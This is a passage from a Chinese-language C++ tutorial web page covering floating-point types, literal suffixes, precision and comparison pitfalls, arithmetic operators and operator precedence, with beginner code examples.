class="line">    <span class="comment">// 标准小数点表示法</span></span><br><span class="line">    <span class="keyword">double</span> price = <span class="number">99.99</span>;</span><br><span class="line">    <span class="keyword">double</span> temperature = <span class="number">-15.5</span>;</span><br><span class="line">    <span class="keyword">double</span> small_fraction = <span class="number">.25</span>; <span class="comment">// 等同于 0.25</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// E 表示法</span></span><br><span class="line">    <span class="keyword">double</span> earth_mass = <span class="number">5.972E24</span>; <span class="comment">// 地球质量 (kg)</span></span><br><span class="line">    <span class="keyword">double</span> electron_charge = <span class="number">-1.602e-19</span>; <span class="comment">// 电子电荷 (库仑)</span></span><br><span class="line">    <span class="keyword">double</span> large_number = <span class="number">1.0e9</span>; <span class="comment">// 10 亿</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Price: &quot;</span> &lt;&lt; price &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Temperature: &quot;</span> &lt;&lt; temperature &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Small fraction: &quot;</span> &lt;&lt; small_fraction &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 默认情况下，cout 可能对非常大或小的数自动使用科学记数法输出</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Earth mass: &quot;</span> &lt;&lt; earth_mass &lt;&lt; <span class="string">&quot; kg&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; </span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Electron charge: &quot;</span> &lt;&lt; electron_charge &lt;&lt; <span class="string">&quot; C&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Large number: &quot;</span> &lt;&lt; large_number &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 可以使用 &lt;iomanip&gt; 控制输出格式 (后续章节会详细介绍)</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span>.setf(<span class="built_in">std</span>::ios_base::fixed, <span class="built_in">std</span>::ios_base::floatfield); <span class="comment">// 设置为定点表示法</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Large number (fixed): &quot;</span> &lt;&lt; large_number &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="3-3-2-浮点类型"><a href="#3-3-2-浮点类型" class="headerlink" title="3.3.2 浮点类型"></a>3.3.2 浮点类型</h3><p>C++提供了三种浮点类型，它们在精度（有效位数）和存储范围上有所不同：</p><ol><li> <strong><code>float</code>:</strong> 单精度浮点数。通常占用 4 个字节 (32位)。精度较低，范围较小。</li><li> <strong><code>double</code>:</strong> 双精度浮点数。通常占用 8 个字节 (64位)。精度和范围比 <code>float</code> 大很多。这是C++中最常用的浮点类型，浮点常量（如 <code>3.14</code>）默认就是 <code>double</code> 类型。</li><li> <strong><code>long double</code>:</strong> 扩展精度浮点数。通常占用 8、10、12 或 16 个字节，具体取决于编译器和系统。提供最高的精度和最大的范围。</li></ol><p><strong>精度和范围:</strong></p><ul><li><strong>精度 (Precision):</strong> 指的是可以表示的有效数字的位数。<ul><li>  <code>float</code> 通常保证至少 6 位有效数字。</li><li>  <code>double</code> 通常保证至少 15 位有效数字。</li><li>  <code>long double</code> 通常提供比 <code>double</code> 更高的精度。</li></ul></li><li>  <strong>范围 (Range):</strong> 指的是可以表示的最小和最大数值。<code>double</code> 的范围远大于 <code>float</code>，<code>long double</code> 的范围通常更大。</li></ul><p>可以使用 <code>&lt;cfloat&gt;</code> (或 C 语言的 <code>&lt;float.h&gt;</code>) 头文件中的常量来查看具体系统的精度和范围限制（例如 <code>FLT_DIG</code>, <code>DBL_DIG</code>, <code>LDBL_DIG</code> 表示有效位数）。</p><p><strong>用法与示例:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cfloat&gt; // 包含浮点数限制信息</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 查看各种类型占用的字节数</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Size of float: &quot;</span> &lt;&lt; <span class="keyword">sizeof</span>(<span class="keyword">float</span>) &lt;&lt; <span class="string">&quot; bytes&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Size of double: &quot;</span> &lt;&lt; <span class="keyword">sizeof</span>(<span class="keyword">double</span>) &lt;&lt; <span class="string">&quot; bytes&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Size of long double: &quot;</span> &lt;&lt; <span class="keyword">sizeof</span>(<span class="keyword">long</span> <span class="keyword">double</span>) &lt;&lt; <span class="string">&quot; bytes&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 查看精度 (有效位数)</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Digits of precision for float: &quot;</span> &lt;&lt; FLT_DIG &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Digits of precision for double: &quot;</span> &lt;&lt; DBL_DIG &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Digits of precision for long double: &quot;</span> &lt;&lt; LDBL_DIG &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 声明和初始化</span></span><br><span class="line">    <span class="keyword">float</span> f_pi = <span class="number">3.14159265f</span>; <span class="comment">// f 后缀表示 float</span></span><br><span class="line">    <span class="keyword">double</span> d_pi = <span class="number">3.141592653589793</span>; <span class="comment">// 默认是 double</span></span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">double</span> ld_pi = <span class="number">3.14159265358979323846L</span>; <span class="comment">// L 后缀表示 long double</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span>.precision(<span class="number">20</span>); <span class="comment">// 设置 cout 输出精度以便观察差异</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;float pi:       &quot;</span> &lt;&lt; f_pi &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;double pi:      &quot;</span> &lt;&lt; d_pi &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;long double pi: &quot;</span> &lt;&lt; ld_pi &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>选择建议:</strong></p><ul><li>  除非有特别的内存或性能考虑，并且确定 <code>float</code> 的精度足够，否则**优先使用 <code>double</code>**。它是C++浮点计算的常用类型。</li><li>  当需要极高的精度或非常大的数值范围时，使用 <code>long double</code>。</li></ul><h3 id="3-3-3-浮点常量"><a href="#3-3-3-浮点常量" class="headerlink" title="3.3.3 浮点常量"></a>3.3.3 浮点常量</h3><p>浮点常量（字面值）就是直接写在代码中的浮点数值，例如 <code>3.14</code>, <code>1.0</code>, <code>-2.5e8</code>。</p><p><strong>默认类型:</strong><br>默认情况下，C++将不带后缀的浮点常量视为 <code>double</code> 类型。</p><p><strong>后缀 (Suffixes):</strong><br>可以通过添加后缀来显式指定浮点常量的类型：</p><ul><li>  <code>f</code> 或 <code>F</code>: 表示 <code>float</code> 类型。</li><li>  <code>l</code> 或 <code>L</code>: 表示 <code>long double</code> 类型。</li></ul><p><strong>用法与示例:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;typeinfo&gt; // 用于 typeid (仅作演示)</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 默认类型是 double</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Type of 3.14: &quot;</span> &lt;&lt; <span class="keyword">typeid</span>(<span class="number">3.14</span>).name() &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; </span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Type of 1.0e-5: &quot;</span> &lt;&lt; <span class="keyword">typeid</span>(<span class="number">1.0e-5</span>).name() &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 使用后缀指定类型</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Type of 3.14f: &quot;</span> &lt;&lt; <span class="keyword">typeid</span>(<span class="number">3.14f</span>).name() &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// float</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Type of 3.14F: &quot;</span> &lt;&lt; <span class="keyword">typeid</span>(<span class="number">3.14F</span>).name() &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// float</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Type of 3.14l: &quot;</span> &lt;&lt; <span class="keyword">typeid</span>(<span class="number">3.14l</span>).name() &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// long double</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Type of 3.14L: &quot;</span> &lt;&lt; <span class="keyword">typeid</span>(<span class="number">3.14L</span>).name() &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// long double</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 赋值时的类型匹配</span></span><br><span class="line">    <span class="keyword">float</span> price = <span class="number">99.99f</span>; <span class="comment">// 使用 f 后缀避免从 double 到 float 的可能精度损失警告</span></span><br><span class="line">    <span class="keyword">double</span> weight = <span class="number">75.5</span>; <span class="comment">// 75.5 是 double, 赋值给 double 变量</span></span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">double</span> distance = <span class="number">1.23e10</span>L; <span class="comment">// 使用 L 后缀</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Price: &quot;</span> &lt;&lt; price &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Weight: &quot;</span> &lt;&lt; weight &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Distance: &quot;</span> &lt;&lt; distance &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><em>(注意: <code>typeid().name()</code> 的输出可能因编译器而异，但可以大致看出类型)</em></p><p>在将常量赋给 <code>float</code> 变量时，使用 <code>f</code> 或 <code>F</code> 后缀是一个好习惯，可以避免编译器产生关于从 <code>double</code> 转换到 <code>float</code> 可能丢失精度的警告。</p><h3 id="3-3-4-浮点数的优缺点"><a href="#3-3-4-浮点数的优缺点" class="headerlink" title="3.3.4 浮点数的优缺点"></a>3.3.4 浮点数的优缺点</h3><p>浮点数在表示实数方面非常有用，但也存在一些固有的限制和需要注意的地方。</p><p><strong>优点:</strong></p><ol><li> <strong>表示范围广:</strong> 可以表示比整型大得多或小得多的数值。</li><li> <strong>表示小数:</strong> 可以表示整数无法表示的小数部分。</li><li> <strong>标准化:</strong> 大多数现代计算机都遵循 IEEE 754 标准来表示和处理浮点数，这提高了可移植性。</li></ol><p><strong>缺点:</strong></p><ol><li> <strong>精度限制:</strong> 浮点数只能<strong>近似</strong>地表示大多数实数。由于内部使用二进制表示，某些在十进制下看起来很精确的小数（如 0.1）在二进制浮点表示中可能是无限循环小数，只能存储一个近似值。这会导致微小的**舍入误差 (Rounding Error)**。</li><li> <strong>比较困难:</strong> 由于精度限制，直接使用 <code>==</code> 来比较两个浮点数是否相等通常是不可靠的。微小的舍入误差可能导致逻辑上应该相等的两个数在内部表示上略有不同。比较浮点数时，通常应该检查它们的差值是否在一个很小的<strong>容差 (Tolerance)</strong> 范围内。</li><li> <strong>运算速度:</strong> 浮点运算通常比整型运算慢（尽管现代处理器有专门的浮点单元来优化）。</li><li> <strong>特殊值:</strong> IEEE 754 标准定义了一些特殊值，如 <code>NaN</code> (Not a Number，例如 0.0/0.0 的结果) 和无穷大 (<code>Infinity</code>，例如 1.0/0.0 的结果)，需要在使用时注意处理。</li></ol><p><strong>用法与示例 (精度问题和比较):</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cmath&gt;   // 为了 fabs (计算绝对值)</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iomanip&gt; // 为了 setprecision</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 精度问题示例</span></span><br><span class="line">    <span class="keyword">double</span> a = <span class="number">0.1</span>;</span><br><span class="line">    <span class="keyword">double</span> b = <span class="number">0.2</span>;</span><br><span class="line">    <span class="keyword">double</span> sum = a + b; <span class="comment">// 理论上应该是 0.3</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="built_in">std</span>::setprecision(<span class="number">20</span>); <span class="comment">// 显示更多小数位</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;a = &quot;</span> &lt;&lt; a &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;b = &quot;</span> &lt;&lt; b &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;a + b = &quot;</span> &lt;&lt; sum &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 输出可能不是精确的 0.3</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (sum == <span class="number">0.3</span>) &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Comparison (==): sum is equal to 0.3&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Comparison (==): sum is NOT equal to 0.3&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 很可能执行这里</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 正确的比较方法：检查差值是否在容差范围内</span></span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">double</span> TOLERANCE = <span class="number">1e-9</span>; <span class="comment">// 定义一个很小的容差值</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">std</span>::<span class="built_in">fabs</span>(sum - <span class="number">0.3</span>) &lt; TOLERANCE) &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Comparison (tolerance): sum is close enough to 0.3&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 应该执行这里</span></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Comparison (tolerance): sum is NOT close enough to 0.3&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 另一个例子</span></span><br><span class="line">    <span class="keyword">float</span> x = <span class="number">1.0f</span> / <span class="number">3.0f</span>;</span><br><span class="line">    <span class="keyword">float</span> y = <span class="number">3.0f</span> * x;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;y = 3.0f * (1.0f / 3.0f) = &quot;</span> &lt;&lt; y &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 可能不是精确的 1.0</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>总结:</strong> 在使用浮点数时，要意识到它们是近似值，并避免直接进行相等性比较。在需要精确计算（如金融计算）的场合，可能需要使用专门的库或定点数表示法。对于大多数科学和工程计算，<code>double</code> 提供了足够的精度和范围。</p><h2 id="3-4-C-算术运算符"><a href="#3-4-C-算术运算符" class="headerlink" title="3.4 C++算术运算符"></a>3.4 C++算术运算符</h2><p>C++提供了丰富的运算符来执行算术计算。本节将介绍基本的算术运算符、它们的优先级和结合性、整数除法和求模运算、类型转换以及 C++11 引入的 <code>auto</code> 类型推断。</p><p><strong>基本算术运算符:</strong></p><ul><li>  <code>+</code>: 加法 (Addition)</li><li>  <code>-</code>: 减法 (Subtraction)</li><li>  <code>*</code>: 乘法 (Multiplication)</li><li>  <code>/</code>: 除法 (Division)</li><li>  <code>%</code>: 求模 (Modulo) 或求余 (Remainder)</li></ul><p>这些运算符可以用于 C++ 的所有数值类型（整型和浮点型），但求模运算符 <code>%</code> 通常只用于整数类型。</p><p><strong>用法与示例:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">double</span> price = <span class="number">15.50</span>;</span><br><span class="line">    <span class="keyword">double</span> tax_rate = <span class="number">0.08</span>;</span><br><span class="line">    <span class="keyword">int</span> quantity = <span class="number">3</span>;</span><br><span class="line">    <span class="keyword">int</span> total_items = <span class="number">17</span>;</span><br><span class="line">    <span class="keyword">int</span> items_per_box = <span class="number">5</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 加法</span></span><br><span class="line">    <span class="keyword">double</span> total_price = price * quantity + <span class="number">5.0</span>; <span class="comment">// 假设有 5 元附加费</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Total price (with fee): &quot;</span> &lt;&lt; total_price &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 减法</span></span><br><span class="line">    <span class="keyword">double</span> price_before_tax = price / (<span class="number">1</span> + tax_rate); <span class="comment">// 假设 price 已含税</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Price before tax: &quot;</span> &lt;&lt; price_before_tax &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 乘法</span></span><br><span class="line">    <span class="keyword">double</span> tax_amount = price_before_tax * tax_rate;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Tax amount: &quot;</span> &lt;&lt; tax_amount &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 除法 (浮点数)</span></span><br><span class="line">    <span class="keyword">double</span> average_price = total_price / quantity;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Average price per item: &quot;</span> &lt;&lt; average_price &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 除法 (整数) - 见 3.4.2</span></span><br><span class="line">    <span class="keyword">int</span> full_boxes = total_items / items_per_box; </span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Full boxes: &quot;</span> &lt;&lt; full_boxes &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 输出 3</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 求模 - 见 3.4.3</span></span><br><span class="line">    <span class="keyword">int</span> remaining_items = total_items % items_per_box;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Remaining items: &quot;</span> &lt;&lt; remaining_items &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 输出 2</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 一元减法 (取负)</span></span><br><span class="line">    <span class="keyword">double</span> discount = <span class="number">-10.0</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Discount: &quot;</span> &lt;&lt; discount &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 一元加法 (通常无效果)</span></span><br><span class="line">    <span class="keyword">double</span> positive_value = +price;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Positive value: &quot;</span> &lt;&lt; positive_value &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="3-4-1-运算符优先级和结合性"><a href="#3-4-1-运算符优先级和结合性" class="headerlink" title="3.4.1 运算符优先级和结合性"></a>3.4.1 运算符优先级和结合性</h3><p>当一个表达式中包含多个运算符时，<strong>优先级 (Precedence)</strong> 和 <strong>结合性 (Associativity)</strong> 决定了运算的执行顺序。</p><ul><li>  <strong>优先级:</strong> 哪个运算符先执行。优先级高的运算符先于优先级低的运算符执行。例如，乘法和除法的优先级高于加法和减法。</li><li><strong>结合性:</strong> 当多个具有相同优先级的运算符连续出现时，它们的执行顺序。<ul><li>  <strong>左结合性 (Left-to-Right):</strong> 运算从左向右执行。大多数二元算术运算符（<code>+</code>, <code>-</code>, <code>*</code>, <code>/</code>, <code>%</code>）都是左结合的。例如 <code>a - b + c</code> 等价于 <code>(a - b) + c</code>。</li><li>  <strong>右结合性 (Right-to-Left):</strong> 运算从右向左执行。赋值运算符 <code>=</code> 和一元运算符（如取负 <code>-</code>）是右结合的。例如 <code>a = b = c</code> 等价于 <code>a = (b = c)</code>。</li></ul></li></ul><p><strong>常见算术运算符优先级 (由高到低):</strong></p><ol><li> 一元运算符: <code>+</code> (正号), <code>-</code> (负号) - (右结合)</li><li> 乘法、除法、求模: <code>*</code>, <code>/</code>, <code>%</code> - (左结合)</li><li> 加法、减法: <code>+</code>, <code>-</code> - (左结合)</li><li> 赋值运算符: <code>=</code> - (右结合)</li></ol><p><strong>使用括号:</strong> 可以使用圆括号 <code>()</code> 来覆盖默认的优先级和结合性，强制按特定顺序执行运算。括号内的表达式总是最先计算。</p><p><strong>用法与示例:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span 